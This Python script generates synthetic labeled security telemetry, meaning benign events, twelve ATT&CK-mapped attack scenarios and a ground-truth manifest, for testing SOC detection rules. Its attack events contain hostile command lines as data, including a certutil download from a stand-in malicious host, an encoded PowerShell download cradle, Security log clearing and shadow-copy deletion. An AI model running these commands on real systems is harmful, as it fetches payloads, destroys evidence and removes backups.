"""
Synthetic Telemetry Generator for SOC Detection Engineering Lab.
Generates realistic labeled security datasets:
1. Benign operational baseline telemetry (normal user activity, standard IT tasks)
2. Atomic Red Team attack simulation telemetry (labeled positive cases for all 12 detection rules)
3. Edge case telemetry (malformed fields, clock skew, null values, unicode strings)
4. Ground truth manifest mapping expected alerts and classifications.
"""

import os
import json
import random
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Any


def generate_all_datasets(output_dir: str):
    random.seed(42)
    os.makedirs(os.path.join(output_dir, "synthetic"), exist_ok=True)
    os.makedirs(os.path.join(output_dir, "manifests"), exist_ok=True)

    base_time = datetime(2026, 10, 10, 9, 0, 0, tzinfo=timezone.utc)

    # 1. GENERATE BENIGN BASELINE
    benign_events: List[Dict[str, Any]] = []
    
    # Benign logins (single failures, normal successes)
    users = ["alice", "bob", "carol", "david", "svc-backup", "deployer"]
    hosts = ["ws-sales-01", "ws-finance-02", "srv-db-01", "srv-app-01"]
    
    for i in range(60):
        t = base_time + timedelta(seconds=i * 20)
        u = random.choice(users)
        h = random.choice(hosts)
        # Single occasional mistyped password
        is_fail = (i % 15 == 0)
        benign_events.append({
            "event_id": f"benign-auth-{i:03d}",
            "timestamp": t.isoformat(),
            "event_source": "LinuxAuth",
            "event_type": "authentication",
            "action": "login_failed" if is_fail else "login_success",
            "host": h,
            "user": u,
            "source_ip": f"10.0.1.{random.randint(10, 50)}",
            "source_port": random.randint(49152, 65535),
            "dest_ip": "10.0.0.5",
            "dest_port": 22,
            "protocol": "SSH",
            "status": "failure" if is_fail else "success",
            "raw_log": f"Oct 10 09:{i//60:02d}:{i%60:02d} {h} sshd[102{i}]: {'Failed' if is_fail else 'Accepted'} password for {u} from 10.0.1.20 port 51234 ssh2"
        })

    # Benign process execution (normal apps, notepad, git, python, chrome)
    benign_procs = [
        ("notepad.exe", "notepad.exe C:\\Users\\alice\\notes.txt", "explorer.exe"),
        ("git.exe", "git.exe status", "cmd.exe"),
        ("chrome.exe", "chrome.exe --enable-features=NetworkService", "explorer.exe"),
        ("python.exe", "python.exe -m pytest tests/", "pwsh.exe"),
        ("excel.exe", "excel.exe C:\\Users\\carol\\Documents\\budget.xlsx", "explorer.exe"),
        ("code.exe", "code.exe .", "explorer.exe")
    ]
    for i in range(40):
        t = base_time + timedelta(seconds=1200 + i * 30)
        pname, cmd, parent = random.choice(benign_procs)
        h = random.choice(hosts)
        benign_events.append({
            "event_id": f"benign-proc-{i:03d}",
            "timestamp": t.isoformat(),
            "event_source": "Sysmon",
            "event_type": "process_creation",
            "action": "process_created",
            "host": h,
            "user": "alice",
            "process_name": pname,
            "command_line": cmd,
            "parent_process_name": parent,
            "status": "success",
            "raw_log": json.dumps({"EventID": 1, "Image": f"C:\\Windows\\System32\\{pname}", "CommandLine": cmd, "Computer": h})
        })

    # Benign network & DNS queries (google, github, microsoft)
    benign_domains = ["api.github.com", "login.microsoftonline.com", "update.googleapis.com", "pypi.org", "internal.corp.local"]
    for i in range(40):
        t = base_time + timedelta(seconds=2400 + i * 25)
        d = random.choice(benign_domains)
        benign_events.append({
            "event_id": f"benign-dns-{i:03d}",
            "timestamp": t.isoformat(),
            "event_source": "ZeekDNS",
            "event_type": "dns_query",
            "action": "dns_lookup",
            "host": "ws-sales-01",
            "source_ip": "10.0.1.25",
            "dest_ip": "1.1.1.1",
            "dest_port": 53,
            "protocol": "DNS",
            "dns_query_name": d,
            "status": "success",
            "raw_log": json.dumps({"event_type": "dns", "query": d, "src_ip": "10.0.1.25"})
        })

    # Benign small outbound data transfer
    for i in range(20):
        t = base_time + timedelta(seconds=3400 + i * 40)
        benign_events.append({
            "event_id": f"benign-net-{i:03d}",
            "timestamp": t.isoformat(),
            "event_source": "ZeekConn",
            "event_type": "network_connection",
            "action": "flow_recorded",
            "host": "srv-app-01",
            "source_ip": "10.0.1.50",
            "dest_ip": "142.250.180.206",
            "dest_port": 443,
            "bytes_out": random.randint(500, 20480), # Small traffic < 20KB
            "bytes_in": random.randint(5000, 50000),
            "status": "success",
            "raw_log": json.dumps({"orig_bytes": 12000, "resp_bytes": 45000, "dest_port": 443})
        })

    # 2. GENERATE ATTACK SCENARIOS (Positive test cases for each of the 12 rules)
    attack_events: List[Dict[str, Any]] = []
    ground_truth_manifest: Dict[str, Any] = {
        "metadata": {
            "name": "SOC Detection Engineering Lab Labeled Benchmark",
            "version": "1.0.0",
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "total_attack_scenarios": 12
        },
        "scenarios": []
    }

    atk_start = base_time + timedelta(hours=2)

    # SCENARIO 1: DET-001 Repeated Login Failures (T1110.001)
    s1_events = []
    s1_time = atk_start + timedelta(minutes=5)
    for i in range(8):
        ev = {
            "event_id": f"atk-det001-fail-{i:02d}",
            "timestamp": (s1_time + timedelta(seconds=i * 10)).isoformat(),
            "event_source": "LinuxAuth",
            "event_type": "authentication",
            "action": "login_failed",
            "host": "srv-prod-auth",
            "user": "root",
            "source_ip": "198.51.100.44",
            "source_port": 50000 + i,
            "dest_port": 22,
            "protocol": "SSH",
            "status": "failure",
            "raw_log": f"Oct 10 11:05:{i*10:02d} srv-prod-auth sshd[2201{i}]: Failed password for invalid user root from 198.51.100.44 port {50000+i} ssh2"
        }
        s1_events.append(ev)
        attack_events.append(ev)

    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-001",
        "expected_rule": "DET-001",
        "technique_id": "T1110.001",
        "technique_name": "Password Guessing",
        "description": "8 rapid SSH password failures against user root from untrusted external IP",
        "trigger_event_id": "atk-det001-fail-04",
        "event_ids": [e["event_id"] for e in s1_events]
    })

    # SCENARIO 2: DET-002 Login After Failures (T1078)
    s2_events = []
    s2_time = atk_start + timedelta(minutes=15)
    for i in range(5):
        ev = {
            "event_id": f"atk-det002-fail-{i:02d}",
            "timestamp": (s2_time + timedelta(seconds=i * 8)).isoformat(),
            "event_source": "WindowsSecurity",
            "event_type": "authentication",
            "action": "login_failed",
            "host": "dc-01",
            "user": "finance-admin",
            "source_ip": "203.0.113.88",
            "dest_port": 3389,
            "status": "failure",
            "raw_log": json.dumps({"EventID": 4625, "TargetUserName": "finance-admin", "IpAddress": "203.0.113.88", "Computer": "dc-01"})
        }
        s2_events.append(ev)
        attack_events.append(ev)

    # Success event immediately following
    ev_succ = {
        "event_id": "atk-det002-succ-01",
        "timestamp": (s2_time + timedelta(seconds=50)).isoformat(),
        "event_source": "WindowsSecurity",
        "event_type": "authentication",
        "action": "login_success",
        "host": "dc-01",
        "user": "finance-admin",
        "source_ip": "203.0.113.88",
        "dest_port": 3389,
        "status": "success",
        "raw_log": json.dumps({"EventID": 4624, "TargetUserName": "finance-admin", "IpAddress": "203.0.113.88", "Computer": "dc-01"})
    }
    s2_events.append(ev_succ)
    attack_events.append(ev_succ)

    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-002",
        "expected_rule": "DET-002",
        "technique_id": "T1078",
        "technique_name": "Valid Accounts",
        "description": "5 brute-force failures followed immediately by successful logon for finance-admin",
        "trigger_event_id": "atk-det002-succ-01",
        "event_ids": [e["event_id"] for e in s2_events]
    })

    # SCENARIO 3: DET-003 LOLBAS certutil download (T1059.003)
    ev_lolbas = {
        "event_id": "atk-det003-certutil",
        "timestamp": (atk_start + timedelta(minutes=25)).isoformat(),
        "event_source": "Sysmon",
        "event_type": "process_creation",
        "action": "process_created",
        "host": "ws-dev-01",
        "user": "developer",
        "process_name": "certutil.exe",
        "process_path": "C:\\Windows\\System32\\certutil.exe",
        "command_line": "certutil.exe -urlcache -split -f http://evil-payload-drop.org/beacon.exe C:\\Temp\\beacon.exe",
        "parent_process_name": "cmd.exe",
        "status": "success",
        "raw_log": json.dumps({
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://evil-payload-drop.org/beacon.exe C:\\Temp\\beacon.exe",
            "Computer": "ws-dev-01"
        })
    }
    attack_events.append(ev_lolbas)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-003",
        "expected_rule": "DET-003",
        "technique_id": "T1059.003",
        "technique_name": "LOLBAS Abuse",
        "description": "certutil download cradle staging remote beacon.exe",
        "trigger_event_id": "atk-det003-certutil",
        "event_ids": ["atk-det003-certutil"]
    })

    # SCENARIO 4: DET-004 Suspicious PowerShell Web Cradle (T1059.001)
    ev_ps = {
        "event_id": "atk-det004-pscradle",
        "timestamp": (atk_start + timedelta(minutes=30)).isoformat(),
        "event_source": "Sysmon",
        "event_type": "process_creation",
        "action": "process_created",
        "host": "ws-finance-02",
        "user": "carol",
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -nop -noni -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBjADIALgBsAGEAYgAvAHMALgBwAHMAMQAiACkA",
        "parent_process_name": "winword.exe",
        "status": "success",
        "raw_log": json.dumps({
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -noni -w hidden -enc SQBFAFg...",
            "Computer": "ws-finance-02"
        })
    }
    attack_events.append(ev_ps)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-004",
        "expected_rule": "DET-004",
        "technique_id": "T1059.001",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "description": "PowerShell spawned by Word macro executing encoded download cradle",
        "trigger_event_id": "atk-det004-pscradle",
        "event_ids": ["atk-det004-pscradle"]
    })

    # SCENARIO 5: DET-005 Security Logging Disabled (T1562.001)
    ev_wevt = {
        "event_id": "atk-det005-wevtutil",
        "timestamp": (atk_start + timedelta(minutes=35)).isoformat(),
        "event_source": "Sysmon",
        "event_type": "process_creation",
        "action": "process_created",
        "host": "ws-finance-02",
        "user": "SYSTEM",
        "process_name": "wevtutil.exe",
        "command_line": "wevtutil cl Security",
        "status": "success",
        "raw_log": json.dumps({"EventID": 1, "Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil cl Security", "Computer": "ws-finance-02"})
    }
    attack_events.append(ev_wevt)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-005",
        "expected_rule": "DET-005",
        "technique_id": "T1562.001",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "description": "Adversary clearing Security event log with wevtutil cl Security",
        "trigger_event_id": "atk-det005-wevtutil",
        "event_ids": ["atk-det005-wevtutil"]
    })

    # SCENARIO 6: DET-006 Privilege Group Modification (T1098)
    ev_priv = {
        "event_id": "atk-det006-privadd",
        "timestamp": (atk_start + timedelta(minutes=40)).isoformat(),
        "event_source": "WindowsSecurity",
        "event_type": "privilege_change",
        "action": "group_member_added",
        "host": "dc-01",
        "user": "compromised-admin",
        "target_user": "backdoor-user",
        "target_group": "Domain Admins",
        "status": "success",
        "raw_log": json.dumps({"EventID": 4728, "SubjectUserName": "compromised-admin", "MemberName": "backdoor-user", "TargetUserName": "Domain Admins", "Computer": "dc-01"})
    }
    attack_events.append(ev_priv)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-006",
        "expected_rule": "DET-006",
        "technique_id": "T1098",
        "technique_name": "Account Manipulation",
        "description": "User backdoor-user added to Domain Admins group",
        "trigger_event_id": "atk-det006-privadd",
        "event_ids": ["atk-det006-privadd"]
    })

    # SCENARIO 7: DET-007 Registry Run Key Persistence (T1547.001)
    ev_run = {
        "event_id": "atk-det007-runkey",
        "timestamp": (atk_start + timedelta(minutes=45)).isoformat(),
        "event_source": "Sysmon",
        "event_type": "registry_modification",
        "action": "registry_value_set",
        "host": "ws-sales-01",
        "user": "alice",
        "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        "registry_value": "C:\\Users\\alice\\AppData\\Local\\Temp\\update_agent.exe",
        "status": "success",
        "raw_log": json.dumps({
            "EventID": 13,
            "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
            "Details": "C:\\Users\\alice\\AppData\\Local\\Temp\\update_agent.exe",
            "Computer": "ws-sales-01"
        })
    }
    attack_events.append(ev_run)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-007",
        "expected_rule": "DET-007",
        "technique_id": "T1547.001",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys",
        "description": "Persistence established in HKCU CurrentVersion\\Run pointing to temp payload",
        "trigger_event_id": "atk-det007-runkey",
        "event_ids": ["atk-det007-runkey"]
    })

    # SCENARIO 8: DET-008 Scheduled Task Creation (T1053.005)
    ev_task = {
        "event_id": "atk-det008-schtask",
        "timestamp": (atk_start + timedelta(minutes=50)).isoformat(),
        "event_source": "Sysmon",
        "event_type": "process_creation",
        "action": "process_created",
        "host": "ws-sales-01",
        "user": "SYSTEM",
        "process_name": "schtasks.exe",
        "command_line": "schtasks.exe /create /tn \"SystemCheck\" /tr \"powershell.exe -w hidden -enc AAA...\" /sc onstart /ru system",
        "status": "success",
        "raw_log": json.dumps({
            "EventID": 1,
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": "schtasks.exe /create /tn \"SystemCheck\" /tr \"powershell.exe -w hidden...\" /sc onstart /ru system",
            "Computer": "ws-sales-01"
        })
    }
    attack_events.append(ev_task)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-008",
        "expected_rule": "DET-008",
        "technique_id": "T1053.005",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "description": "Scheduled task created running hidden powershell at startup as SYSTEM",
        "trigger_event_id": "atk-det008-schtask",
        "event_ids": ["atk-det008-schtask"]
    })

    # SCENARIO 9: DET-009 Port Scan Probing (T1046)
    s9_events = []
    s9_time = atk_start + timedelta(minutes=55)
    target_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]
    for i, port in enumerate(target_ports):
        ev = {
            "event_id": f"atk-det009-port-{i:02d}",
            "timestamp": (s9_time + timedelta(seconds=i * 2)).isoformat(),
            "event_source": "ZeekConn",
            "event_type": "network_connection",
            "action": "flow_recorded",
            "host": "sensor-internal",
            "source_ip": "10.0.1.99",
            "source_port": 40000 + i,
            "dest_ip": "10.0.0.10",
            "dest_port": port,
            "protocol": "TCP",
            "bytes_out": 40,
            "bytes_in": 0,
            "status": "success",
            "raw_log": json.dumps({"orig_bytes": 40, "resp_bytes": 0, "dest_port": port, "src_ip": "10.0.1.99", "dest_ip": "10.0.0.10"})
        }
        s9_events.append(ev)
        attack_events.append(ev)

    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-009",
        "expected_rule": "DET-009",
        "technique_id": "T1046",
        "technique_name": "Network Service Discovery",
        "description": "Port scan from 10.0.1.99 across 15 distinct ports on 10.0.0.10 within 30 seconds",
        "trigger_event_id": "atk-det009-port-09",
        "event_ids": [e["event_id"] for e in s9_events]
    })

    # SCENARIO 10: DET-010 DNS Tunneling (T1071.004)
    ev_dns = {
        "event_id": "atk-det010-dnstunnel",
        "timestamp": (atk_start + timedelta(minutes=60)).isoformat(),
        "event_source": "ZeekDNS",
        "event_type": "dns_query",
        "action": "dns_lookup",
        "host": "sensor-dns",
        "source_ip": "10.0.1.25",
        "dest_ip": "8.8.8.8",
        "dest_port": 53,
        "protocol": "DNS",
        "dns_query_name": "v38fa7b89d6e8fa97b0a7c4f3b1a2d5e7.tunnel.exfil-c2.net",
        "status": "success",
        "raw_log": json.dumps({"event_type": "dns", "query": "v38fa7b89d6e8fa97b0a7c4f3b1a2d5e7.tunnel.exfil-c2.net", "src_ip": "10.0.1.25"})
    }
    attack_events.append(ev_dns)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-010",
        "expected_rule": "DET-010",
        "technique_id": "T1071.004",
        "technique_name": "Application Layer Protocol: DNS",
        "description": "Base32 encoded high-entropy payload label over .tunnel.exfil-c2.net",
        "trigger_event_id": "atk-det010-dnstunnel",
        "event_ids": ["atk-det010-dnstunnel"]
    })

    # SCENARIO 11: DET-011 Shadow Copy Deletion (T1490)
    ev_vss = {
        "event_id": "atk-det011-vssadmin",
        "timestamp": (atk_start + timedelta(minutes=65)).isoformat(),
        "event_source": "Sysmon",
        "event_type": "process_creation",
        "action": "process_created",
        "host": "srv-db-01",
        "user": "SYSTEM",
        "process_name": "vssadmin.exe",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
        "parent_process_name": "cmd.exe",
        "status": "success",
        "raw_log": json.dumps({"EventID": 1, "Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin.exe delete shadows /all /quiet", "Computer": "srv-db-01"})
    }
    attack_events.append(ev_vss)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-011",
        "expected_rule": "DET-011",
        "technique_id": "T1490",
        "technique_name": "Inhibit System Recovery",
        "description": "Ransomware precursor: deleting volume shadow copies via vssadmin",
        "trigger_event_id": "atk-det011-vssadmin",
        "event_ids": ["atk-det011-vssadmin"]
    })

    # SCENARIO 12: DET-012 Large Outbound Transfer (T1048.003)
    ev_exfil = {
        "event_id": "atk-det012-exfil",
        "timestamp": (atk_start + timedelta(minutes=70)).isoformat(),
        "event_source": "ZeekConn",
        "event_type": "data_transfer",
        "action": "flow_recorded",
        "host": "sensor-internal",
        "source_ip": "10.0.1.75",
        "dest_ip": "198.51.100.99",
        "dest_port": 8443,
        "protocol": "TCP",
        "bytes_out": 73400320, # 70 MB
        "bytes_in": 12048,
        "status": "success",
        "raw_log": json.dumps({"orig_bytes": 73400320, "resp_bytes": 12048, "src_ip": "10.0.1.75", "dest_ip": "198.51.100.99"})
    }
    attack_events.append(ev_exfil)
    ground_truth_manifest["scenarios"].append({
        "scenario_id": "SCN-012",
        "expected_rule": "DET-012",
        "technique_id": "T1048.003",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "description": "70 MB compressed archive egress to untrusted IP 198.51.100.99",
        "trigger_event_id": "atk-det012-exfil",
        "event_ids": ["atk-det012-exfil"]
    })

    # 3. GENERATE EDGE CASES
    edge_cases: List[Dict[str, Any]] = [
        # Missing fields
        {
            "event_id": "edge-001-null-host",
            "timestamp": (base_time + timedelta(hours=4)).isoformat(),
            "event_source": "LinuxAuth",
            "event_type": "authentication",
            "action": "login_failed",
            "host": "",
            "user": None,
            "status": "failure",
            "raw_log": "Oct 10 13:00:00 Failed password for from port 0"
        },
        # Duplicate record
        {
            "event_id": "edge-002-dup-event",
            "timestamp": (base_time + timedelta(hours=4, minutes=1)).isoformat(),
            "event_source": "Sysmon",
            "event_type": "process_creation",
            "action": "process_created",
            "host": "ws-sales-01",
            "user": "alice",
            "process_name": "notepad.exe",
            "command_line": "notepad.exe",
            "status": "success",
            "raw_log": "duplicated"
        },
        # Clock skew (1 hour in the past)
        {
            "event_id": "edge-003-clock-skew",
            "timestamp": (base_time - timedelta(hours=2)).isoformat(),
            "event_source": "Sysmon",
            "event_type": "process_creation",
            "action": "process_created",
            "host": "ws-sales-01",
            "user": "alice",
            "process_name": "calc.exe",
            "command_line": "calc.exe",
            "status": "success",
            "raw_log": "skewed"
        },
        # Unicode characters in username and commandline
        {
            "event_id": "edge-004-unicode",
            "timestamp": (base_time + timedelta(hours=4, minutes=5)).isoformat(),
            "event_source": "LinuxAuth",
            "event_type": "authentication",
            "action": "login_failed",
            "host": "srv-app-01",
            "user": "管理员_admin_ñ_⚡",
            "source_ip": "10.0.1.22",
            "status": "failure",
            "raw_log": "Unicode user test"
        },
        # Malformed JSON
        {
            "event_id": "edge-005-malformed",
            "timestamp": (base_time + timedelta(hours=4, minutes=10)).isoformat(),
            "event_source": "Synthetic",
            "event_type": "unknown",
            "raw_log": "{malformed json without quotes: 123"
        }
    ]

    # Write files
    benign_path = os.path.join(output_dir, "synthetic", "benign_baseline.jsonl")
    with open(benign_path, "w", encoding="utf-8") as f:
        for ev in benign_events:
            f.write(json.dumps(ev) + "\n")

    attack_path = os.path.join(output_dir, "synthetic", "attack_scenarios.jsonl")
    with open(attack_path, "w", encoding="utf-8") as f:
        for ev in attack_events:
            f.write(json.dumps(ev) + "\n")

    edge_path = os.path.join(output_dir, "synthetic", "edge_cases.jsonl")
    with open(edge_path, "w", encoding="utf-8") as f:
        for ev in edge_cases:
            f.write(json.dumps(ev) + "\n")

    manifest_path = os.path.join(output_dir, "manifests", "ground_truth.json")
    with open(manifest_path, "w", encoding="utf-8") as f:
        json.dump(ground_truth_manifest, f, indent=2)

    print(f"Generated {len(benign_events)} benign events -> {benign_path}")
    print(f"Generated {len(attack_events)} attack events across 12 scenarios -> {attack_path}")
    print(f"Generated {len(edge_cases)} edge case events -> {edge_path}")
    print(f"Generated ground truth manifest -> {manifest_path}")


if __name__ == "__main__":
    generate_all_datasets("datasets")
